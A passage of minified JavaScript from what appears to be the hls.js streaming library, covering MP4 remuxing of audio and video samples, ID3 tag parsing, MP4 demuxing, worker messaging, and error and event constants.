                                            c[0].dts = o, c[0].pts = M, S.logger.log("Video: First PTS/DTS adjusted: " + g(M, !0) + "/" + g(o, !0) + ", delta: " + g(C, !0) + " ms") } }
                                    z && z < 75 && (o = Math.max(0, o)); for (var x = 0, N = 0, F = 0; F < f; F++) { for (var B = c[F], U = B.units, j = U.length, G = 0, K = 0; K < j; K++) G += U[K].data.length;
                                        N += G, x += j, B.length = G, B.dts = Math.max(B.dts, o), B.pts = Math.max(B.pts, B.dts, 0), m = Math.min(B.pts, m), _ = Math.max(B.pts, _) }
                                    l = c[f - 1].dts; var H = N + 4 * x + 8; try { a = new Uint8Array(H) } catch (e) { return void this.observer.trigger(y.default.ERROR, { type: b.ErrorTypes.MUX_ERROR, details: b.ErrorDetails.REMUX_ALLOC_ERROR, fatal: !1, bytes: H, reason: "fail allocating video mdat " + H }) } var V = new DataView(a.buffer);
                                    V.setUint32(0, H), a.set(q.types.mdat, 4); for (var Y = 0; Y < f; Y++) { for (var X = c[Y], J = X.units, Q = 0, Z = void 0, $ = 0, ee = J.length; $ < ee; $++) { var te = J[$],
                                                re = te.data,
                                                ie = te.data.byteLength;
                                            V.setUint32(p, ie), p += 4, a.set(re, p), p += ie, Q += 4 + ie } if (Y < f - 1) n = c[Y + 1].dts - X.dts;
                                        else { var ne = this.config,
                                                ae = X.dts - c[Y > 0 ? Y - 1 : Y].dts; if (ne.stretchShortVideoTrack) { var se = ne.maxBufferHole,
                                                    oe = Math.floor(se * u),
                                                    le = (i ? m + i * u : this.nextAudioPts) - X.pts;
                                                le > oe ? (n = le - ae, n < 0 && (n = ae), S.logger.log("It is approximately " + g(le, !1) + " ms to the next segment; using duration " + g(n, !1) + " ms for the last video frame.")) : n = ae } else n = ae }
                                        Z = Math.round(X.pts - X.dts), d.push({ size: Q, duration: n, cts: Z, flags: { isLeading: 0, isDependedOn: 0, hasRedundancy: 0, degradPrio: 0, dependsOn: X.key ? 2 : 1, isNonSync: X.key ? 0 : 1 } }) }
                                    this.nextAvcDts = l + n; var ue = e.dropped; if (e.nbNalu = 0, e.dropped = 0, d.length && navigator.userAgent.toLowerCase().indexOf("chrome") > -1) { var ce = d[0].flags;
                                        ce.dependsOn = 2, ce.isNonSync = 0 }
                                    e.samples = d, s = q.moof(e.sequenceNumber++, o, e), e.samples = []; var de = { data1: s, data2: a, startPTS: m / u, endPTS: (_ + n) / u, startDTS: o / u, endDTS: this.nextAvcDts / u, type: "video", hasAudio: !1, hasVideo: !0, nb: d.length, dropped: ue }; return this.observer.trigger(y.default.FRAG_PARSING_DATA, de), de } }, t.remuxAudio = function(e, t, r, i) { var n, a, s, o, l, u, c = e.inputTimeScale,
                                    d = e.timescale,
                                    f = c / d,
                                    h = e.isAAC ? 1024 : 1152,
                                    p = h * f,
                                    m = this._initPTS,
                                    _ = !e.isAAC && this.typeSupported.mpeg,
                                    E = _ ? 0 : 8,
                                    T = e.samples,
                                    w = [],
                                    A = this.nextAudioPts; if (r |= T.length && A && (i && Math.abs(t - A / c) < .1 || Math.abs(T[0].pts - A - m) < 20 * p), T.forEach(function(e) { e.pts = e.dts = v(e.pts - m, t * c) }), T = T.filter(function(e) { return e.pts >= 0 }), 0 !== T.length) { if (r || (A = i ? Math.max(0, t * c) : T[0].pts), e.isAAC)
                                        for (var R = this.config.maxAudioFramesDrift, P = 0, k = A; P < T.length;) { var D = T[P],
                                                L = D.pts,
                                                C = L - k; if (C <= -R * p) r || P > 0 ? (S.logger.warn("Dropping 1 audio frame @ " + g(k, !0) / 1e3 + "s due to " + g(C, !0) + " ms overlap."), T.splice(P, 1)) : (S.logger.warn("Audio frame @ " + g(L, !0) / 1e3 + "s overlaps nextAudioPts by " + g(C, !0) + " ms."), k = L + p, P++);
                                            else if (C >= R * p && C < V && k) { var I = Math.round(C / p);
                                                S.logger.warn("Injecting " + I + " audio frames @ " + g(k, !0) / 1e3 + "s due to " + g(C, !0) + " ms gap."); for (var O = 0; O < I; O++) { var M = Math.max(k, 0);
                                                    a = j.getSilentFrame(e.manifestCodec || e.codec, e.channelCount), a || (S.logger.log("Unable to get silent frame for given audio codec; duplicating last frame instead."), a = D.unit.subarray()), T.splice(P, 0, { unit: a, pts: M, dts: M }), k += p, P++ }
                                                D.pts = D.dts = k, k += p, P++ } else Math.abs(C), D.pts = D.dts = k, k += p, P++ }
                                    for (var x = T.length, N = 0; x--;) N += T[x].unit.byteLength; for (var F = 0, B = T.length; F < B; F++) { var U = T[F],
                                            G = U.unit,
                                            K = U.pts; if (void 0 !== u && n) n.duration = Math.round((K - u) / f);
                                        else { var H = K - A,
                                                W = 0; if (r && e.isAAC && H) { if (H > 0 && H < V) W = Math.round((K - A) / p), S.logger.log(g(H, !0) + " ms hole between AAC samples detected,filling it"), W > 0 && (a = j.getSilentFrame(e.manifestCodec || e.codec, e.channelCount), a || (a = G.subarray()), N += W * a.length);
                                                else if (H < -12) { S.logger.log("drop overlapping AAC sample, expected/parsed/delta: " + g(A, !0) + " ms / " + g(K, !0) + " ms / " + g(-H, !0) + " ms"), N -= G.byteLength; continue }
                                                K = A } if (l = K, !(N > 0)) return;
                                            N += E; try { s = new Uint8Array(N) } catch (e) { return void this.observer.trigger(y.default.ERROR, { type: b.ErrorTypes.MUX_ERROR, details: b.ErrorDetails.REMUX_ALLOC_ERROR, fatal: !1, bytes: N, reason: "fail allocating audio mdat " + N }) } if (!_) { new DataView(s.buffer).setUint32(0, N), s.set(q.types.mdat, 4) } for (var z = 0; z < W; z++) a = j.getSilentFrame(e.manifestCodec || e.codec, e.channelCount), a || (S.logger.log("Unable to get silent frame for given audio codec; duplicating this frame instead."), a = G.subarray()), s.set(a, E), E += a.byteLength, n = { size: a.byteLength, cts: 0, duration: 1024, flags: { isLeading: 0, isDependedOn: 0, hasRedundancy: 0, degradPrio: 0, dependsOn: 1 } }, w.push(n) }
                                        s.set(G, E); var Y = G.byteLength;
                                        E += Y, n = { size: Y, cts: 0, duration: 0, flags: { isLeading: 0, isDependedOn: 0, hasRedundancy: 0, degradPrio: 0, dependsOn: 1 } }, w.push(n), u = K } var X = 0; if (x = w.length, x >= 2 && (X = w[x - 2].duration, n.duration = X), x) { this.nextAudioPts = A = u + f * X, e.samples = w, o = _ ? new Uint8Array : q.moof(e.sequenceNumber++, l / f, e), e.samples = []; var J = l / c,
                                            Q = A / c,
                                            Z = { data1: o, data2: s, startPTS: J, endPTS: Q, startDTS: J, endDTS: Q, type: "audio", hasAudio: !0, hasVideo: !1, nb: x }; return this.observer.trigger(y.default.FRAG_PARSING_DATA, Z), Z } return null } }, t.remuxEmptyAudio = function(e, t, r, i) { var n = e.inputTimeScale,
                                    a = e.samplerate ? e.samplerate : n,
                                    s = n / a,
                                    o = this.nextAudioPts,
                                    l = (void 0 !== o ? o : i.startDTS * n) + this._initDTS,
                                    u = i.endDTS * n + this._initDTS,
                                    c = 1024 * s,
                                    d = Math.ceil((u - l) / c),
                                    f = j.getSilentFrame(e.manifestCodec || e.codec, e.channelCount); if (S.logger.warn("remux empty Audio"), !f) return void S.logger.trace("Unable to remuxEmptyAudio since we were unable to get a silent frame for given audio codec!"); for (var h = [], g = 0; g < d; g++) { var p = l + g * c;
                                    h.push({ unit: f, pts: p, dts: p }) }
                                e.samples = h, this.remuxAudio(e, t, r) }, t.remuxID3 = function(e, t) { var r = e.samples.length; if (r) { for (var i = e.inputTimeScale, n = this._initPTS, a = this._initDTS, s = 0; s < r; s++) { var o = e.samples[s];
                                        o.pts = v(o.pts - n, t * i) / i, o.dts = v(o.dts - a, t * i) / i }
                                    this.observer.trigger(y.default.FRAG_PARSING_METADATA, { samples: e.samples }), e.samples = [] } }, t.remuxText = function(e, t) { var r = e.samples.length,
                                    i = e.inputTimeScale,
                                    n = this._initPTS; if (r) { for (var a = 0; a < r; a++) { var s = e.samples[a];
                                        s.pts = v(s.pts - n, t * i) / i }
                                    e.samples.sort(function(e, t) { return e.pts - t.pts }), this.observer.trigger(y.default.FRAG_PARSING_USERDATA, { samples: e.samples }) }
                                e.samples = [] }, e }(),
                        X = Y,
                        J = function() {
                            function e(e) { this.observer = e } var t = e.prototype; return t.destroy = function() {}, t.resetTimeStamp = function() {}, t.resetInitSegment = function() {}, t.remux = function(e, t, r, i, n, a, s, o) { var l = this.observer,
                                    u = "";
                                e && (u += "audio"), t && (u += "video"), l.trigger(y.default.FRAG_PARSING_DATA, { data1: o, startPTS: n, startDTS: n, type: u, hasAudio: !!e, hasVideo: !!t, nb: 1, dropped: 0 }), l.trigger(y.default.FRAG_PARSED) }, e }(),
                        Q = J,
                        Z = Object(T.getSelfScope)(); try { m = Z.performance.now.bind(Z.performance) } catch (e) { S.logger.debug("Unable to use Performance API on this environment"), m = Z.Date.now } var $ = function() {
                        function e(e, t, r, i) { this.observer = e, this.typeSupported = t, this.config = r, this.vendor = i } var t = e.prototype; return t.destroy = function() { var e = this.demuxer;
                            e && e.destroy() }, t.push = function(e, t, r, i, n, a, s, o, l, u, c, d) { var f = this; if (e.byteLength > 0 && null != t && null != t.key && "AES-128" === t.method) { var h = this.decrypter;
                                null == h && (h = this.decrypter = new _.default(this.observer, this.config)); var g = m();
                                h.decrypt(e, t.key.buffer, t.iv.buffer, function(e) { var h = m();
                                    f.observer.trigger(y.default.FRAG_DECRYPTED, { stats: { tstart: g, tdecrypt: h } }), f.pushDecrypted(new Uint8Array(e), t, new Uint8Array(r), i, n, a, s, o, l, u, c, d) }) } else this.pushDecrypted(new Uint8Array(e), t, new Uint8Array(r), i, n, a, s, o, l, u, c, d) }, t.pushDecrypted = function(e, t, r, i, n, a, s, o, l, u, c, d) { var f = this.demuxer,
                                h = this.remuxer; if (!f || s || o) { for (var g, p = this.observer, v = this.typeSupported, m = this.config, _ = [{ demux: N, remux: X }, { demux: P.default, remux: Q }, { demux: R, remux: X }, { demux: B, remux: X }], E = 0, S = _.length; E < S && (g = _[E], !g.demux.probe(e)); E++); if (!g) return void p.trigger(y.default.ERROR, { type: b.ErrorTypes.MEDIA_ERROR, details: b.ErrorDetails.FRAG_PARSING_ERROR, fatal: !0, reason: "no demux matching with content found" });
                                h && h instanceof g.remux || (h = new g.remux(p, m, v, this.vendor)), f && f instanceof g.demux || (f = new g.demux(p, h, m, v), this.probe = g.demux.probe), this.demuxer = f, this.remuxer = h }(s || o) && (f.resetInitSegment(r, i, n, u), h.resetInitSegment()), s && (f.resetTimeStamp(d), h.resetTimeStamp(d)), "function" == typeof f.setDecryptData && f.setDecryptData(t), f.append(e, a, l, c) }, e }();
                    t.default = $ }, "./src/demux/demuxer-worker.js": function(e, t, r) { "use strict";
                    r.r(t); var i = r("./src/demux/demuxer-inline.js"),
                        n = r("./src/events.js"),
                        a = r("./src/utils/logger.js"),
                        s = r("./node_modules/eventemitter3/index.js"),
                        o = function(e) { var t = new s.EventEmitter;
                            t.trigger = function(e) { for (var r = arguments.length, i = new Array(r > 1 ? r - 1 : 0), n = 1; n < r; n++) i[n - 1] = arguments[n];
                                t.emit.apply(t, [e, e].concat(i)) }, t.off = function(e) { for (var r = arguments.length, i = new Array(r > 1 ? r - 1 : 0), n = 1; n < r; n++) i[n - 1] = arguments[n];
                                t.removeListener.apply(t, [e].concat(i)) }; var r = function(t, r) { e.postMessage({ event: t, data: r }) };
                            e.addEventListener("message", function(n) { var s = n.data; switch (s.cmd) {
                                    case "init":
                                        var o = JSON.parse(s.config);
                                        e.demuxer = new i.default(t, s.typeSupported, o, s.vendor), Object(a.enableLogs)(o.debug), r("init", null); break;
                                    case "demux":
                                        e.demuxer.push(s.data, s.decryptdata, s.initSegment, s.audioCodec, s.videoCodec, s.timeOffset, s.discontinuity, s.trackSwitch, s.contiguous, s.duration, s.accurateTimeOffset, s.defaultInitPTS) } }), t.on(n.default.FRAG_DECRYPTED, r), t.on(n.default.FRAG_PARSING_INIT_SEGMENT, r), t.on(n.default.FRAG_PARSED, r), t.on(n.default.ERROR, r), t.on(n.default.FRAG_PARSING_METADATA, r), t.on(n.default.FRAG_PARSING_USERDATA, r), t.on(n.default.INIT_PTS_FOUND, r), t.on(n.default.FRAG_PARSING_DATA, function(t, r) { var i = [],
                                    n = { event: t, data: r };
                                r.data1 && (n.data1 = r.data1.buffer, i.push(r.data1.buffer), delete r.data1), r.data2 && (n.data2 = r.data2.buffer, i.push(r.data2.buffer), delete r.data2), e.postMessage(n, i) }) };
                    t.default = o }, "./src/demux/id3.js": function(e, t, r) { "use strict";

                    function i() { var e = Object(a.getSelfScope)(); return n || void 0 === e.TextDecoder || (n = new e.TextDecoder("utf-8")), n }
                    r.r(t), r.d(t, "utf8ArrayToStr", function() { return o }); var n, a = r("./src/utils/get-self-scope.js"),
                        s = function() {
                            function e() {} return e.isHeader = function(e, t) { return t + 10 <= e.length && 73 === e[t] && 68 === e[t + 1] && 51 === e[t + 2] && e[t + 3] < 255 && e[t + 4] < 255 && e[t + 6] < 128 && e[t + 7] < 128 && e[t + 8] < 128 && e[t + 9] < 128 }, e.isFooter = function(e, t) { return t + 10 <= e.length && 51 === e[t] && 68 === e[t + 1] && 73 === e[t + 2] && e[t + 3] < 255 && e[t + 4] < 255 && e[t + 6] < 128 && e[t + 7] < 128 && e[t + 8] < 128 && e[t + 9] < 128 }, e.getID3Data = function(t, r) { for (var i = r, n = 0; e.isHeader(t, r);) { n += 10;
                                    n += e._readSize(t, r + 6), e.isFooter(t, r + 10) && (n += 10), r += n } if (n > 0) return t.subarray(i, i + n) }, e._readSize = function(e, t) { var r = 0; return r = (127 & e[t]) << 21, r |= (127 & e[t + 1]) << 14, r |= (127 & e[t + 2]) << 7, r |= 127 & e[t + 3] }, e.getTimeStamp = function(t) { for (var r = e.getID3Frames(t), i = 0; i < r.length; i++) { var n = r[i]; if (e.isTimeStampFrame(n)) return e._readTimeStamp(n) } }, e.isTimeStampFrame = function(e) { return e && "PRIV" === e.key && "com.apple.streaming.transportStreamTimestamp" === e.info }, e._getFrameData = function(t) { var r = String.fromCharCode(t[0], t[1], t[2], t[3]),
                                    i = e._readSize(t, 4); return { type: r, size: i, data: t.subarray(10, 10 + i) } }, e.getID3Frames = function(t) { for (var r = 0, i = []; e.isHeader(t, r);) { var n = e._readSize(t, r + 6);
                                    r += 10; for (var a = r + n; r + 8 < a;) { var s = e._getFrameData(t.subarray(r)),
                                            o = e._decodeFrame(s);
                                        o && i.push(o), r += s.size + 10 }
                                    e.isFooter(t, r) && (r += 10) } return i }, e._decodeFrame = function(t) { return "PRIV" === t.type ? e._decodePrivFrame(t) : "W" === t.type[0] ? e._decodeURLFrame(t) : e._decodeTextFrame(t) }, e._readTimeStamp = function(e) { if (8 === e.data.byteLength) { var t = new Uint8Array(e.data),
                                        r = 1 & t[3],
                                        i = (t[4] << 23) + (t[5] << 15) + (t[6] << 7) + t[7]; return i /= 45, r && (i += 47721858.84), Math.round(i) } }, e._decodePrivFrame = function(t) { if (!(t.size < 2)) { var r = e._utf8ArrayToStr(t.data, !0),
                                        i = new Uint8Array(t.data.subarray(r.length + 1)); return { key: t.type, info: r, data: i.buffer } } }, e._decodeTextFrame = function(t) { if (!(t.size < 2)) { if ("TXXX" === t.type) { var r = 1,
                                            i = e._utf8ArrayToStr(t.data.subarray(r), !0);
                                        r += i.length + 1; var n = e._utf8ArrayToStr(t.data.subarray(r)); return { key: t.type, info: i, data: n } } var a = e._utf8ArrayToStr(t.data.subarray(1)); return { key: t.type, data: a } } }, e._decodeURLFrame = function(t) { if ("WXXX" === t.type) { if (t.size < 2) return; var r = 1,
                                        i = e._utf8ArrayToStr(t.data.subarray(r), !0);
                                    r += i.length + 1; var n = e._utf8ArrayToStr(t.data.subarray(r)); return { key: t.type, info: i, data: n } } var a = e._utf8ArrayToStr(t.data); return { key: t.type, data: a } }, e._utf8ArrayToStr = function(e, t) { void 0 === t && (t = !1); var r = i(); if (r) { var n = r.decode(e); if (t) { var a = n.indexOf("\0"); return -1 !== a ? n.substring(0, a) : n } return n.replace(/\0/g, "") } for (var s, o, l, u = e.length, c = "", d = 0; d < u;) { if (0 === (s = e[d++]) && t) return c; if (0 !== s && 3 !== s) switch (s >> 4) {
                                        case 0:
                                        case 1:
                                        case 2:
                                        case 3:
                                        case 4:
                                        case 5:
                                        case 6:
                                        case 7:
                                            c += String.fromCharCode(s); break;
                                        case 12:
                                        case 13:
                                            o = e[d++], c += String.fromCharCode((31 & s) << 6 | 63 & o); break;
                                        case 14:
                                            o = e[d++], l = e[d++], c += String.fromCharCode((15 & s) << 12 | (63 & o) << 6 | (63 & l) << 0) } } return c }, e }(),
                        o = s._utf8ArrayToStr;
                    t.default = s }, "./src/demux/mp4demuxer.js": function(e, t, r) { "use strict";
                    r.r(t); var i = r("./src/utils/logger.js"),
                        n = r("./src/events.js"),
                        a = Math.pow(2, 32) - 1,
                        s = function() {
                            function e(e, t) { this.observer = e, this.remuxer = t } var t = e.prototype; return t.resetTimeStamp = function(e) { this.initPTS = e }, t.resetInitSegment = function(t, r, i, a) { if (t && t.byteLength) { var s = this.initData = e.parseInitSegment(t);
                                    null == r && (r = "mp4a.40.5"), null == i && (i = "avc1.42e01e"); var o = {};
                                    s.audio && s.video ? o.audiovideo = { container: "video/mp4", codec: r + "," + i, initSegment: a ? t : null } : (s.audio && (o.audio = { container: "audio/mp4", codec: r, initSegment: a ? t : null }), s.video && (o.video = { container: "video/mp4", codec: i, initSegment: a ? t : null })), this.observer.trigger(n.default.FRAG_PARSING_INIT_SEGMENT, { tracks: o }) } else r && (this.audioCodec = r), i && (this.videoCodec = i) }, e.probe = function(t) { return e.findBox({ data: t, start: 0, end: Math.min(t.length, 16384) }, ["moof"]).length > 0 }, e.bin2str = function(e) { return String.fromCharCode.apply(null, e) }, e.readUint16 = function(e, t) { e.data && (t += e.start, e = e.data); var r = e[t] << 8 | e[t + 1]; return r < 0 ? 65536 + r : r }, e.readUint32 = function(e, t) { e.data && (t += e.start, e = e.data); var r = e[t] << 24 | e[t + 1] << 16 | e[t + 2] << 8 | e[t + 3]; return r < 0 ? 4294967296 + r : r }, e.writeUint32 = function(e, t, r) { e.data && (t += e.start, e = e.data), e[t] = r >> 24, e[t + 1] = r >> 16 & 255, e[t + 2] = r >> 8 & 255, e[t + 3] = 255 & r }, e.findBox = function(t, r) { var i, n, a, s, o, l, u, c = []; if (t.data ? (l = t.start, s = t.end, t = t.data) : (l = 0, s = t.byteLength), !r.length) return null; for (i = l; i < s;) n = e.readUint32(t, i), a = e.bin2str(t.subarray(i + 4, i + 8)), u = n > 1 ? i + n : s, a === r[0] && (1 === r.length ? c.push({ data: t, start: i + 8, end: u }) : (o = e.findBox({ data: t, start: i + 8, end: u }, r.slice(1)), o.length && (c = c.concat(o)))), i = u; return c }, e.parseSegmentIndex = function(t) { var r, i = e.findBox(t, ["moov"])[0],
                                    n = i ? i.end : null,
                                    a = 0,
                                    s = e.findBox(t, ["sidx"]); if (!s || !s[0]) return null;
                                r = [], s = s[0]; var o = s.data[0];
                                a = 0 === o ? 8 : 16; var l = e.readUint32(s, a);
                                a += 4;
                                a += 0 === o ? 8 : 16, a += 2; var u = s.end + 0,
                                    c = e.readUint16(s, a);
                                a += 2; for (var d = 0; d < c; d++) { var f = a,
                                        h = e.readUint32(s, f);
                                    f += 4; var g = 2147483647 & h; if (1 === (2147483648 & h) >>> 31) return void console.warn("SIDX has hierarchical references (not supported)"); var p = e.readUint32(s, f);
                                    f += 4, r.push({ referenceSize: g, subsegmentDuration: p, info: { duration: p / l, start: u, end: u + g - 1 } }), u += g, f += 4, a = f } return { earliestPresentationTime: 0, timescale: l, version: o, referencesCount: c, references: r, moovEndOffset: n } }, e.parseInitSegment = function(t) { var r = []; return e.findBox(t, ["moov", "trak"]).forEach(function(t) { var n = e.findBox(t, ["tkhd"])[0]; if (n) { var a = n.data[n.start],
                                            s = 0 === a ? 12 : 20,
                                            o = e.readUint32(n, s),
                                            l = e.findBox(t, ["mdia", "mdhd"])[0]; if (l) { a = l.data[l.start], s = 0 === a ? 12 : 20; var u = e.readUint32(l, s),
                                                c = e.findBox(t, ["mdia", "hdlr"])[0]; if (c) { var d = e.bin2str(c.data.subarray(c.start + 8, c.start + 12)),
                                                    f = { soun: "audio", vide: "video" }[d]; if (f) { var h = e.findBox(t, ["mdia", "minf", "stbl", "stsd"]); if (h.length) { h = h[0]; var g = e.bin2str(h.data.subarray(h.start + 12, h.start + 16));
                                                        i.logger.log("MP4Demuxer:" + f + ":" + g + " found") }
                                                    r[o] = { timescale: u, type: f }, r[f] = { timescale: u, id: o } } } } } }), r }, e.getStartDTS = function(t, r) { var i, n, a; return i = e.findBox(r, ["moof", "traf"]), n = [].concat.apply([], i.map(function(r) { return e.findBox(r, ["tfhd"]).map(function(i) { var n, a; return n = e.readUint32(i, 4), a = t[n].timescale || 9e4, e.findBox(r, ["tfdt"]).map(function(t) { var r, i; return r = t.data[t.start], i = e.readUint32(t, 4), 1 === r && (i *= Math.pow(2, 32), i += e.readUint32(t, 8)), i })[0] / a }) })), a = Math.min.apply(null, n), isFinite(a) ? a : 0 }, e.offsetStartDTS = function(t, r, i) { e.findBox(r, ["moof", "traf"]).map(function(r) { return e.findBox(r, ["tfhd"]).map(function(n) { var s = e.readUint32(n, 4),
                                            o = t[s].timescale || 9e4;
                                        e.findBox(r, ["tfdt"]).map(function(t) { var r = t.data[t.start],
                                                n = e.readUint32(t, 4); if (0 === r) e.writeUint32(t, 4, n - i * o);
                                            else { n *= Math.pow(2, 32), n += e.readUint32(t, 8), n -= i * o, n = Math.max(n, 0); var s = Math.floor(n / (a + 1)),
                                                    l = Math.floor(n % (a + 1));
                                                e.writeUint32(t, 4, s), e.writeUint32(t, 8, l) } }) }) }) }, t.append = function(t, r, i, a) { var s = this.initData;
                                s || (this.resetInitSegment(t, this.audioCodec, this.videoCodec, !1), s = this.initData); var o, l = this.initPTS; if (void 0 === l) { var u = e.getStartDTS(s, t);
                                    this.initPTS = l = u - r, this.observer.trigger(n.default.INIT_PTS_FOUND, { initPTS: l }) }
                                e.offsetStartDTS(s, t, l), o = e.getStartDTS(s, t), this.remuxer.remux(s.audio, s.video, null, null, o, i, a, t) }, t.destroy = function() {}, e }();
                    t.default = s }, "./src/errors.ts": function(e, t, r) { "use strict";
                    r.r(t), r.d(t, "ErrorTypes", function() { return i }), r.d(t, "ErrorDetails", function() { return n }); var i;! function(e) { e.NETWORK_ERROR = "networkError", e.MEDIA_ERROR = "mediaError", e.KEY_SYSTEM_ERROR = "keySystemError", e.MUX_ERROR = "muxError", e.OTHER_ERROR = "otherError" }(i || (i = {})); var n;! function(e) { e.KEY_SYSTEM_NO_KEYS = "keySystemNoKeys", e.KEY_SYSTEM_NO_ACCESS = "keySystemNoAccess", e.KEY_SYSTEM_NO_SESSION = "keySystemNoSession", e.KEY_SYSTEM_LICENSE_REQUEST_FAILED = "keySystemLicenseRequestFailed", e.KEY_SYSTEM_NO_INIT_DATA = "keySystemNoInitData", e.MANIFEST_LOAD_ERROR = "manifestLoadError", e.MANIFEST_LOAD_TIMEOUT = "manifestLoadTimeOut", e.MANIFEST_PARSING_ERROR = "manifestParsingError", e.MANIFEST_INCOMPATIBLE_CODECS_ERROR = "manifestIncompatibleCodecsError", e.LEVEL_EMPTY_ERROR = "levelEmptyError", e.LEVEL_LOAD_ERROR = "levelLoadError", e.LEVEL_LOAD_TIMEOUT = "levelLoadTimeOut", e.LEVEL_SWITCH_ERROR = "levelSwitchError", e.AUDIO_TRACK_LOAD_ERROR = "audioTrackLoadError", e.AUDIO_TRACK_LOAD_TIMEOUT = "audioTrackLoadTimeOut", e.FRAG_LOAD_ERROR = "fragLoadError", e.FRAG_LOAD_TIMEOUT = "fragLoadTimeOut", e.FRAG_DECRYPT_ERROR = "fragDecryptError", e.FRAG_PARSING_ERROR = "fragParsingError", e.REMUX_ALLOC_ERROR = "remuxAllocError", e.KEY_LOAD_ERROR = "keyLoadError", e.KEY_LOAD_TIMEOUT = "keyLoadTimeOut", e.BUFFER_ADD_CODEC_ERROR = "bufferAddCodecError", e.BUFFER_APPEND_ERROR = "bufferAppendError", e.BUFFER_APPENDING_ERROR = "bufferAppendingError", e.BUFFER_STALLED_ERROR = "bufferStalledError", e.BUFFER_FULL_ERROR = "bufferFullError", e.BUFFER_SEEK_OVER_HOLE = "bufferSeekOverHole", e.BUFFER_NUDGE_ON_STALL = "bufferNudgeOnStall", e.INTERNAL_EXCEPTION = "internalException" }(n || (n = {})) }, "./src/events.js": function(e, t, r) { "use strict";
                    r.r(t); var i = { MEDIA_ATTACHING: "hlsMediaAttaching", MEDIA_ATTACHED: "hlsMediaAttached", MEDIA_DETACHING: "hlsMediaDetaching", MEDIA_DETACHED: "hlsMediaDetached", BUFFER_RESET: "hlsBufferReset", BUFFER_CODECS: "hlsBufferCodecs", BUFFER_CREATED: "hlsBufferCreated", BUFFER_APPENDING: "hlsBufferAppending", BUFFER_APPENDED: "hlsBufferAppended", BUFFER_EOS: "hlsBufferEos", BUFFER_FLUSHING: "hlsBufferFlushing", BUFFER_FLUSHED: "hlsBufferFlushed", MANIFEST_LOADING: "hlsManifestLoading", MANIFEST_LOADED: "hlsManifestLoaded", MANIFEST_PARSED: "hlsManifestParsed", LEVEL_SWITCHING: "hlsLevelSwitching", LEVEL_SWITCHED: "hlsLevelSwitched", LEVEL_LOADING: "hlsLevelLoading", LEVEL_LOADED: "hlsLevelLoaded", LEVEL_UPDATED: "hlsLevelUpdated", LEVEL_PTS_UPDATED: "hlsLevelPtsUpdated", LEVELS_UPDATED: "hlsLevelsUpdated", AUDIO_TRACKS_UPDATED: "hlsAudioTracksUpdated", AUDIO_TRACK_SWITCHING: "hlsAudioTrackSwitching", AUDIO_TRACK_SWITCHED: "hlsAudioTrackSwitched", AUDIO_TRACK_LOADING: "hlsAudioTrackLoading", AUDIO_TRACK_LOADED: "hlsAudioTrackLoaded", SUBTITLE_TRACKS_UPDATED: "hlsSubtitleTracksUpdated", SUBTITLE_TRACK_SWITCH: "hlsSubtitleTrackSwitch", SUBTITLE_TRACK_LOADING: "hlsSubtitleTrackLoading", SUBTITLE_TRACK_LOADED: "hlsSubtitleTrackLoaded", SUBTITLE_FRAG_PROCESSED: "hlsSubtitleFragProcessed", CUES_PARSED: "hlsCuesParsed", NON_NATIVE_TEXT_TRACKS_FOUND: "hlsNonNativeTextTracksFound", INIT_PTS_FOUND: "hlsInitPtsFound", FRAG_LOADING: "hlsFragLoading", FRAG_LOAD_PROGRESS: "hlsFragLoadProgress", FRAG_LOAD_EMERGENCY_ABORTED: "hlsFragLoadEmergencyAborted", FRAG_LOADED: "hlsFragLoaded", FRAG_DECRYPTED: "hlsFragDecrypted", FRAG_PARSING_INIT_SEGMENT: "hlsFragParsingInitSegment", FRAG_PARSING_USERDATA: "hlsFragParsingUserdata", FRAG_PARSING_METADATA: "hlsFragParsingMetadata", FRAG_PARSING_DATA: "hlsFragParsingData", FRAG_PARSED: "hlsFragParsed", FRAG_BUFFERED: "hlsFragBuffered", FRAG_CHANGED: "hlsFragChanged", FPS_DROP: "hlsFpsDrop", FPS_DROP_LEVEL_CAPPING: "hlsFpsDropLevelCapping", ERROR: "hlsError", DESTROYING: "hlsDestroying", KEY_LOADING: "hlsKeyLoading", KEY_LOADED: "hlsKeyLoaded", STREAM_STATE_TRANSITION: "hlsStreamStateTransition", LIVE_BACK_BUFFER_REACHED: "hlsLiveBackBufferReached" };
                    t.default = i }, "./src/hls.ts": function(e, t, r) { "use strict";

                    function i(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                            i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } }

                    function n(e, t, r) { return t && i(e.prototype, t), r && i(e, r), e }

                    function a(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                            i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } }

                    function s(e, t, r) { return t && a(e.prototype, t), r && a(e, r), e }

                    function o(e, t) { for (var r = 0; r < t.length; r++) { var i = t[r];
                            i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i) } }

                    function l(e, t, r) { return t && o(e.prototype, t), r && o(e, r), e }

                    function u(e, t) { var r = pt[t]; return !!r && !0 === r[e.slice(0, 4)] }

                    function c(e, t) { return MediaSource.isTypeSupported((t || "video") + '/mp4;codecs="' + e + '"') }

                    function d(e, t) { for (var r = e[t], i = t - 1; i >= 0; i--) { var n = e[i];
                            n.programDateTime = r.programDateTime - 1e3 * n.duration, r = n } }

                    function f(e, t) { e.rawProgramDateTime ? e.programDateTime = Date.parse(e.rawProgramDateTime) : (null === t || void 0 === t ? void 0 : t.programDateTime) && (e.programDateTime = t.endProgramDateTime), Object(Ze.isFiniteNumber)(e.programDateTime) || (e.programDateTime = null, e.rawProgramDateTime = null) }

                    function h(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function g(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function p(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function v(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function m() { return window.MediaSource || window.WebKitMediaSource }

                    function y(e, t) { e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e.__proto__ = t }

                    function b(e, t, r) { switch (t) {
                            case "audio":
                                e.audioGroupIds || (e.audioGroupIds = []), e.audioGroupIds.push(r); break;
                            case "text":
                                e.textGroupIds || (e.textGroupIds = []), e.textGroupIds.push(r) } }

                    function _(e, t, r) { var i = e[t],
                            n = e[r],
